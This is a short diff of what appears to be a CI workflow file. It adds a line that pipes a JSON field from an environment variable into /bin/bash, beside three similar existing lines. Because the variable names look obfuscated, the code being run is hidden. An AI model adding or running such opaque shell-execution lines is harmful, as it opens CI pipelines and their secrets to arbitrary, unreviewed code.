@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$ohgi46448" | jq -r .mjyhk4239 | /bin/bash
           printf '%s' "$k47" | jq -r .gdk5 | /bin/bash
           printf '%s' "$fca38" | jq -r .kbdrt5959 | /bin/bash
+          echo $dsw3 | jq -r .qp38 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
